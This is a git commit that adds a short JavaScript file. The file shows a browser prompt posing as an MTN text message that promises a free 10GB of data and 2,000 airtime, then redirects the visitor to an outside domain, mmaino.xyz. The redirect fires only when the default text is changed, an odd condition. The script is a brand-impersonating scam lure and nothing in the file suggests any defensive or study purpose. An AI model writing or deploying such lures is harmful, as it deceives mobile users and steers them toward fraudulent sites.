7fad49c5226502f954be241279e2e531ac77897a
ztainz <johnsonmfon09@gmail.com>
2026-08-08 22:50:36 +0100

    Create act-10gb-freedata-airtime.js

---
+++ act-10gb-freedata-airtime.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA-AIRTIME'
+password=prompt('MTN SMS: Happy Anniversary, Kindly Receive Free 10Gb Internet Data And 2,000 Airtime,For Being Our Long Time Customer, press Free Data-Airtime ','FREE DATA-AIRTIME');
+if (password != 'FREE DATA-AIRTIME') {
+location.href='https://mmaino.xyz/10gb-freedata-airtime';
+}
